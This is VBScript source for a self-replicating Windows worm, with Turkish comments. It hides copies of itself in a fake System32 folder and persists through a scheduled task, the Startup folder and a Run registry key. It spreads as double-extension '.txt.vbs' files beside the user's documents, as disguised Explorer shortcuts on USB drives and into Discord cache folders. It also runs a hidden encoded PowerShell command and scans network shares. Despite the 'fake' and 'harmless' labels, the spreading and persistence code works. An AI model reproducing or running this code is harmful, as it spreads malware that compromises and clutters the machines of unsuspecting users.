Option Explicit

Dim fso, shell, userProfile, appData, tempFolder, startupFolder, desktopFolder
Dim copyName, wormExtension, usbShortcutName, suspiciousFolder, suspiciousFile
Dim drives, driveLetter, folder, files, file, newFileName

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

userProfile = shell.ExpandEnvironmentStrings("%USERPROFILE%")
appData = shell.ExpandEnvironmentStrings("%APPDATA%")
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
startupFolder = appData & "\Microsoft\Windows\Start Menu\Programs\Startup"
desktopFolder = userProfile & "\Desktop"
copyName = "worm_payload.vbs"
usbShortcutName = "Windows_Explorer.lnk"
wormExtension = ".txt.vbs" ' Çift uzantı, klasik trick
suspiciousFolder = tempFolder & "\System32"
suspiciousFile = suspiciousFolder & "\driver.sys"

' --- 1. Sahte sistem32 klasörü + driver.sys dosyası ---
If Not fso.FolderExists(suspiciousFolder) Then
    fso.CreateFolder(suspiciousFolder)
    shell.Run "attrib +h +s """ & suspiciousFolder & """", 0, True
End If

If Not fso.FileExists(suspiciousFile) Then
    Dim fileHandle
    Set fileHandle = fso.CreateTextFile(suspiciousFile, True)
    fileHandle.WriteLine("Fake rootkit driver loaded.")
    fileHandle.Close
    shell.Run "attrib +h +s """ & suspiciousFile & """", 0, True
End If

' --- 2. Kendini sahte sistem32 klasörüne kopyala ---
If Not fso.FileExists(suspiciousFolder & "\" & copyName) Then
    fso.CopyFile WScript.ScriptFullName, suspiciousFolder & "\" & copyName
    shell.Run "attrib +h +s """ & suspiciousFolder & "\" & copyName & """", 0, True
End If

' --- 3. Startup'a scheduled task olarak ekle ---
shell.Run "schtasks /Create /F /TN WormScheduledTask /TR """ & suspiciousFolder & "\" & copyName & """ /SC ONLOGON /RL HIGHEST", 0, True

' --- 4. Klasörlerde .txt.vbs dosyaları çoğalt (desktop, documents, downloads) ---
Dim commonFolders
commonFolders = Array(userProfile & "\Desktop\", userProfile & "\Documents\", userProfile & "\Downloads\")

Dim i, newFilePath
For i = 0 To UBound(commonFolders)
    folder = commonFolders(i)
    If fso.FolderExists(folder) Then
        ' Klasördeki tüm dosyalar
        Set files = fso.GetFolder(folder).Files
        For Each file In files
            If LCase(fso.GetExtensionName(file.Name)) <> "vbs" Then ' Zaten VBS değilse
                ' Yeni dosya ismi: orjinal + .txt.vbs
                newFileName = file.Name & wormExtension
                newFilePath = folder & newFileName
                If Not fso.FileExists(newFilePath) Then
                    fso.CopyFile WScript.ScriptFullName, newFilePath
                    shell.Run "attrib +h +s """ & newFilePath & """", 0, True
                End If
            End If
        Next
    End If
Next

' --- 5. USB sürücülere Windows Explorer simgeli .lnk bulaştır ---
Dim wshExec, output, lines, line, shortcutPath, shortcut
Set wshExec = shell.Exec("wmic logicaldisk where drivetype=2 get deviceid")
output = wshExec.StdOut.ReadAll
lines = Split(output, vbNewLine)

For Each line In lines
    line = Trim(line)
    If line <> "" And fso.DriveExists(line) Then
        driveLetter = line & "\"
        shortcutPath = driveLetter & usbShortcutName
        If Not fso.FileExists(shortcutPath) Then
            Set shortcut = shell.CreateShortcut(shortcutPath)
            shortcut.TargetPath = suspiciousFolder & "\" & copyName
            shortcut.WorkingDirectory = driveLetter
            shortcut.IconLocation = "explorer.exe, 0"
            shortcut.Description = "Windows Explorer"
            shortcut.WindowStyle = 7
            shortcut.Save
            shell.Run "attrib +h +s """ & shortcutPath & """", 0, True
        End If
    End If
Next

' --- 6. Discord Cache klasörlerine bulaş ---
Dim discordPaths
discordPaths = Array( _
    appData & "\discord\Cache\", _
    appData & "\discordcanary\Cache\", _
    appData & "\discordptb\Cache\" _
)
For Each line In discordPaths
    If fso.FolderExists(line) Then
        If Not fso.FileExists(line & copyName) Then
            fso.CopyFile WScript.ScriptFullName, line & copyName
            shell.Run "attrib +h +s """ & line & copyName & """", 0, True
        End If
    End If
Next

' --- 7. Startup ve Desktop'a tekrar kopyala ---
If Not fso.FileExists(startupFolder & "\" & copyName) Then
    fso.CopyFile WScript.ScriptFullName, startupFolder & "\" & copyName
    shell.Run "attrib +h +s """ & startupFolder & "\" & copyName & """", 0, True
End If

If Not fso.FileExists(desktopFolder & "\" & copyName) Then
    fso.CopyFile WScript.ScriptFullName, desktopFolder & "\" & copyName
    shell.Run "attrib +h +s """ & desktopFolder & "\" & copyName & """", 0, True
End If

' --- 8. Registy startup key ekle ---
shell.Run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WormFake /t REG_SZ /d """ & suspiciousFolder & "\" & copyName & """ /f", 0, True

' --- 9. Kendi kendini CMD üzerinden arka planda başlat ---
shell.Run "cmd /c start \"\" """ & WScript.ScriptFullName & """", 0, False

' --- 10. Base64 encoded PowerShell zararsız kod çalıştır ---
Dim base64ps, powershellCmd
base64ps = "UwB5AHMAdABlAG0AUwBjAHIAaQBwAHQA" ' "SystemScript" gibi dummy base64
powershellCmd = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand " & base64ps
shell.Run powershellCmd, 0, False

' --- 11. Ağda net view ile paylaşım tarama (zararsız) ---
Set wshExec = shell.Exec("cmd /c net view")
Dim shares, share
shares = Split(wshExec.StdOut.ReadAll, vbNewLine)
For Each share In shares
    share = Trim(share)
    If share <> "" And Left(share, 2) = "\\" Then
        ' MsgBox "Network Share Found: " & share
    End If
Next